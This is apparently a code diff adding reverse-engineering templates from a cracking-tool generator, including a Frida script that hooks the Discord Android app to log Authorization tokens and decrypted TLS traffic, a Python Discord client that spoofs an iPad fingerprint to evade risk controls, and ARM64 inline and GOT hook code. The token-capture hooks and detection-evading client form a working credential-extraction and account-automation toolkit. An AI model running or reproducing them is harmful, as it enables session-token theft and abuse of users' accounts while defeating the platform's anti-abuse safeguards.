+    const FastConnectModule = Java.use('com.discord.modules.connect.FastConnectModule');
+    
+    if (FastConnectModule) {
+        FastConnectModule.prepareIdentify.implementation = function() {
+            console.log('[+] WebSocket IDENTIFY 即将发送');
+            const result = this.prepareIdentify();
+            console.log('[+] Identify payload:', JSON.stringify(result));
+            return result;
+        };
+    }
+    
+    // Hook OkHttp 拦截所有 HTTP 请求（包括 Discord API）
+    const OkHttpClient = Java.use('okhttp3.OkHttpClient');
+    const Request = Java.use('okhttp3.Request');
+    
+    // 更通用的方式: hook Interceptor
+    const Interceptor = Java.use('okhttp3.Interceptor');
+    // 找 Discord 的 AuthInterceptor
+    const classes = Java.enumerateLoadedClassesSync();
+    classes.filter(c => c.includes('AuthInterceptor') || c.includes('TokenInterceptor')).forEach(c => {
+        try {
+            const cls = Java.use(c);
+            cls.intercept.implementation = function(chain) {
+                const req = chain.request();
+                const auth = req.header('Authorization');
+                if (auth) console.log('[Discord Token]', auth);
+                return this.intercept(chain);
+            };
+            console.log('[+] Hooked:', c);
+        } catch(e) {}
+    });
+});
+"""
+
+# Rust SO 层 Hook（libdiscore-rn-jsi-module.so）
+FRIDA_RUST_HOOK = """
+// Hook Rust 层的 TLS 连接（reqwest/rustls）
+// 在 SSL_write / SSL_read 层拦截明文数据
+
+const libssl = Process.findModuleByName('libssl.so') || 
+               Process.findModuleByName('libboringssl.so');
+
+if (libssl) {
+    // Hook SSL_write
+    const SSL_write = libssl.findExportByName('SSL_write');
+    if (SSL_write) {
+        Interceptor.attach(SSL_write, {
+            onEnter(args) {
+                const buf = args[1];
+                const len = args[2].toInt32();
+                if (len > 0 && len < 10000) {
+                    const data = Memory.readByteArray(buf, Math.min(len, 2048));
+                    const text = String.fromCharCode.apply(null, new Uint8Array(data));
+                    if (text.includes('discord.com') || text.includes('Authorization')) {
+                        console.log('[SSL_write]', text.slice(0, 500));
+                    }
+                }
+            }
+        });
+    }
+    
+    // Hook SSL_read
+    const SSL_read = libssl.findExportByName('SSL_read');
+    if (SSL_read) {
+        Interceptor.attach(SSL_read, {
+            onLeave(retval) {
+                const len = retval.toInt32();
+                if (len > 0 && len < 10000 && this.context.x1) {
+                    const data = Memory.readByteArray(this.context.x1, Math.min(len, 2048));
+                    const text = String.fromCharCode.apply(null, new Uint8Array(data));
+                    if (text.includes('{') || text.includes('token')) {
+                        console.log('[SSL_read]', text.slice(0, 500));
+                    }
+                }
+            }
+        });
+    }
+}
+"""
+
+# Python 封装 Discord API（还原协议后）
+DISCORD_API_WRAPPER = '''
+import httpx
+import asyncio
+import json
+
+class DiscordProtocol:
+    """基于协议逆向的 Discord API 封装"""
+    
+    BASE_URL = "https://discord.com/api/v10"
+    WS_URL = "wss://gateway.discord.gg/?v=10&encoding=json"
+    
+    # iPad 协议指纹伪装（降低风控概率）
+    HEADERS = {
+        "User-Agent": "Mozilla/5.0 (iPad; CPU iPhone OS 16_3 like Mac OS X) AppleWebKit/605.1.15",
+        "X-Discord-Locale": "zh-CN",
+        "X-Super-Properties": "",  # base64 encoded device fingerprint
+    }
+    
+    def __init__(self, token: str):
+        self.token = token
+        self.headers = {**self.HEADERS, "Authorization": token}
+        self.client = httpx.AsyncClient(headers=self.headers)
+    
+    async def get_user_info(self):
+        """获取当前用户信息"""
+        r = await self.client.get(f"{self.BASE_URL}/users/@me")
+        return r.json()
+    
+    async def get_guilds(self):
+        """获取服务器列表"""
+        r = await self.client.get(f"{self.BASE_URL}/users/@me/guilds")
+        return r.json()
+    
+    async def send_message(self, channel_id: str, content: str):
+        """发送消息"""
+        r = await self.client.post(
+            f"{self.BASE_URL}/channels/{channel_id}/messages",
+            json={"content": content}
+        )
+        return r.json()
+    
+    async def get_messages(self, channel_id: str, limit=50):
+        """获取消息历史"""
+        r = await self.client.get(
+            f"{self.BASE_URL}/channels/{channel_id}/messages",
+            params={"limit": limit}
+        )
+        return r.json()
+
+# OP2 IDENTIFY payload 构造
+def build_identify(token: str, intents: int = 513) -> dict:
+    return {
+        "op": 2,
+        "d": {
+            "token": token,
+            "intents": intents,
+            "properties": {
+                "os": "iOS",
+                "browser": "Discord iOS",
+                "device": "iPad"
+            },
+            "compress": False
+        }
+    }
+
+if __name__ == '__main__':
+    import sys
+    token = sys.argv[1] if len(sys.argv) > 1 else input("Token: ")
+    
+    async def main():
+        dc = DiscordProtocol(token)
+        info = await dc.get_user_info()
+        print(f"[+] 用户: {info.get('username')}#{info.get('discriminator')}")
+        guilds = await dc.get_guilds()
+        print(f"[+] 服务器数量: {len(guilds)}")
+    
+    asyncio.run(main())
+'''
+
+if __name__ == '__main__':
+    with open('discord_frida_hook.js', 'w', encoding='utf-8') as f:
+        f.write(FRIDA_WS_HOOK + '\\n' + FRIDA_RUST_HOOK)
+    with open('discord_api.py', 'w', encoding='utf-8') as f:
+        f.write(DISCORD_API_WRAPPER)
+    print('[+] discord_frida_hook.js 已生成')
+    print('[+] discord_api.py 已生成')
+    print(DISCORD_ARCH)
+`,
+
+      'pojie:hook_native': `// 🔧 自实现Frida风格Inline Hook — ARM64/GOT Hook
+// 目标: {param || 'libtarget.so'}
+// 18_frida_like_hook.js
+// 从0到1构建自己的 Hook 工具 —— Frida 风格的 Inline Hook
+// 来源: https://www.52pojie.cn/thread-2109539-1-1.html
+//
+// 核心原理：在目标函数入口写跳转指令 → 跳到 Trampoline → 执行 Hook 函数 → 返回原函数
+// ARM64: 修改函数前4字节为 B <offset>（相对跳转）或 LDR PC, [PC]; .quad addr（绝对跳转）
+// x86: 修改前5字节为 E9 <offset>（相对跳转）
+
+// Frida 实现版（直接可用）
+const FRIDA_INLINE_HOOK = \`
+// 方案1: Frida Interceptor.replace（最推荐，等价替换整个函数）
+function hookFunction(moduleName, funcName, replaceFn) {
+    const mod = Process.findModuleByName(moduleName);
+    if (!mod) { console.log('[-] Module not found:', moduleName); return; }
+    
+    const sym = mod.findExportByName(funcName);
+    if (!sym) { console.log('[-] Symbol not found:', funcName); return; }
+    
+    // 保存原函数引用
+    const origFn = new NativeFunction(sym, 'int', ['int', 'int']); // 根据实际签名调整
+    
+    Interceptor.replace(sym, new NativeCallback(function(a, b) {
+        const ret = replaceFn(origFn, a, b);
+        return ret;
+    }, 'int', ['int', 'int']));
+    
+    console.log('[+] Hooked:', funcName, 'at', sym);
+}
+
+// 使用示例: Hook Add(a, b) → return Add(a, b) + 100
+hookFunction('libtarget.so', 'Add', (orig, a, b) => {
+    const ret = orig(a, b);
+    console.log(\\\`[Add] \\\${a} + \\\${b} = \\\${ret} -> \\\${ret + 100}\\\`);
+    return ret + 100;
+});
+
+// 方案2: Interceptor.attach（不替换，只监控）
+function traceFunction(address, argTypes) {
+    Interceptor.attach(ptr(address), {
+        onEnter(args) {
+            console.log('[ENTER]', argTypes.map((t,i) => \\\`arg\\\${i}=\\\${args[i]}\\\`).join(', '));
+            this.start = Date.now();
+        },
+        onLeave(retval) {
+            console.log('[LEAVE] ret=', retval, 'elapsed=', Date.now()-this.start, 'ms');
+        }
+    });
+}
+
+// 方案3: Memory.patchCode 手动写跳转指令（底层，灵活）
+function manualHook(targetAddr, hookFn) {
+    // ARM64 绝对跳转（12字节）
+    const trampoline = Memory.alloc(64);
+    
+    // 写入跳转到 hookFn 的指令
+    // LDR X16, #8; BR X16
+    Memory.patchCode(targetAddr, 12, code => {
+        const writer = new Arm64Writer(code, {pc: targetAddr});
+        writer.putLdrRegAddress('x16', hookFn);
+        writer.putBrReg('x16');
+        writer.flush();
+    });
+    
+    console.log('[+] Manual hook installed at', targetAddr);
+}
+\`;
+
+// C++ Native Hook 实现（在 Android SO 里用）
+const CPP_INLINE_HOOK = \`
+// nook inline hook（自实现，ARM64）
+// 原理：将目标函数前4字节替换为 B <trampoline>
+
+#include <sys/mman.h>
+#include <string.h>
+#include <unistd.h>
+
+static int (*orig_Add)(int a, int b) = nullptr;
+
+int Hook_Add(int a, int b) {
+    int ret = orig_Add(a, b);
+    return ret + 100;  // 修改返回值
+}
+
+void* NookInlineHookAddress(void* target, void* hook, void** orig) {
+    // 1. 计算跳转偏移（B指令，相对跳转，范围±128MB）
+    long offset = (long)hook - (long)target;
+    
+    // 2. 修改内存权限为可写可执行
+    long page_size = sysconf(_SC_PAGESIZE);
+    long page_start = (long)target & ~(page_size - 1);
+    mprotect((void*)page_start, page_size * 2, PROT_READ | PROT_WRITE | PROT_EXEC);
+    
+    // 3. 备份原指令（用于 trampoline）
+    uint32_t orig_instr = *(uint32_t*)target;
+    
+    // 4. 写入跳转指令 B <offset>
+    // ARM64 B 指令格式: [31:26]=000101, [25:0]=imm26
+    uint32_t b_instr = 0x14000000 | (((offset / 4) & 0x3FFFFFF));
+    *(uint32_t*)target = b_instr;
+    
+    // 5. 创建 trampoline（执行原指令 + 跳回）
+    uint8_t* tramp = (uint8_t*)mmap(nullptr, 64, PROT_READ|PROT_WRITE|PROT_EXEC,
+                                     MAP_PRIVATE|MAP_ANONYMOUS, -1, 0);
+    memcpy(tramp, &orig_instr, 4);  // 原指令
+    // 写入跳回指令（跳到 target+4）
+    long back_offset = ((long)target + 4) - (long)(tramp + 4);
+    *(uint32_t*)(tramp + 4) = 0x14000000 | (((back_offset / 4) & 0x3FFFFFF));
+    
+    if (orig) *orig = tramp;
+    return tramp;
+}
+
+// 初始化 hook
+void InstallHook() {
+    NookInlineHookAddress(
+        (void*)Add,          // 目标函数
+        (void*)Hook_Add,     // hook函数
+        (void**)&orig_Add    // 保存原函数指针
+    );
+}
+
+// JNI_OnLoad 里调用
+JNIEXPORT jint JNI_OnLoad(JavaVM* vm, void* reserved) {
+    InstallHook();
+    return JNI_VERSION_1_6;
+}
+\`;
+
+// ELF GOT/PLT Hook（更稳定，针对导入函数）
+const GOT_HOOK = \`
+// GOT Hook: 修改 .got.plt 表中函数指针，拦截所有通过 PLT 的调用
+// 比 Inline Hook 更稳定，不需要处理指令备份
+
+#include <link.h>
+#include <elf.h>
+
+void* got_hook(const char* target_lib, const char* func_name, void* new_func) {
+    // 遍历所有加载的 SO
+    struct link_map* map = nullptr;
+    dlinfo(dlopen(target_lib, RTLD_NOW), RTLD_DI_LINKMAP, &map);
+    
+    ElfW(Dyn)* dyn = map->l_ld;
+    ElfW(Rela)* rela = nullptr;
+    ElfW(Sym)* symtab = nullptr;
+    char* strtab = nullptr;
+    size_t rela_count = 0;
+    
+    // 解析动态段
+    while (dyn->d_tag != DT_NULL) {
+        switch(dyn->d_tag) {
+            case DT_JMPREL: rela = (ElfW(Rela)*)dyn->d_un.d_ptr; break;
+            case DT_PLTRELSZ: rela_count = dyn->d_un.d_val / sizeof(ElfW(Rela)); break;
+            case DT_SYMTAB: symtab = (ElfW(Sym)*)dyn->d_un.d_ptr; break;
+            case DT_STRTAB: strtab = (char*)dyn->d_un.d_ptr; break;
+        }
+        dyn++;
+    }
+    
+    // 遍历重定位表找目标函数
+    for (size_t i = 0; i < rela_count; i++) {
+        int sym_idx = ELF64_R_SYM(rela[i].r_info);
+        const char* sym_name = strtab + symtab[sym_idx].st_name;
+        
+        if (strcmp(sym_name, func_name) == 0) {
+            void** got_entry = (void**)(map->l_addr + rela[i].r_offset);
+            void* orig = *got_entry;
+            
+            // 修改 GOT 表项
+            mprotect((void*)((long)got_entry & ~0xFFF), 0x1000, PROT_READ|PROT_WRITE);
+            *got_entry = new_func;
+            
+            return orig;  // 返回原函数指针
+        }
+    }
+    return nullptr;
+}
+\`;
+
+module.exports = { FRIDA_INLINE_HOOK, CPP_INLINE_HOOK, GOT_HOOK };
+`,
+
     };
 
     const key = `${type}:${sub}`;
